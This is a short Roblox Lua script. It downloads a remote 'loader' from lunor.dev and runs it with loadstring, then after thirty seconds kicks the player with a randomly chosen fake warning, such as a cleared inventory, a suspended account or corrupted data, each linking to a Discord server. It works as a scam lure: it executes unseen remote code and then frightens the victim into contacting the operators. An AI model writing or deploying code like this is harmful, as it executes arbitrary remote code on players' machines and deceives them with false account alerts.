-- Run your real loader script inside a protected call
local success, err = pcall(function()
    loadstring(game:HttpGet("https://lunor.dev/loader"))()
end)

-- List of possible kick reasons
local reasons = {
    "Your Inventory has just been cleared!\nhttps://discord.gg/example",
    "Suspicious activity detected on your account.\nhttps://discord.gg/example",
    "Data corruption detected in your save file.\nhttps://discord.gg/example",
    "Multiple account logins detected.\nhttps://discord.gg/example",
    "Your account is temporarily suspended pending review.\nhttps://discord.gg/example"
}

-- If loader succeeded, start the kick timer
if success then
    local delayTime = 30 -- seconds after loader finishes
    task.delay(delayTime, function()
        local player = game:GetService("Players").LocalPlayer
        local reason = reasons[math.random(1, #reasons)]
        player:Kick(reason)
    end)
else
    warn("Loader script failed to run:", err)
end
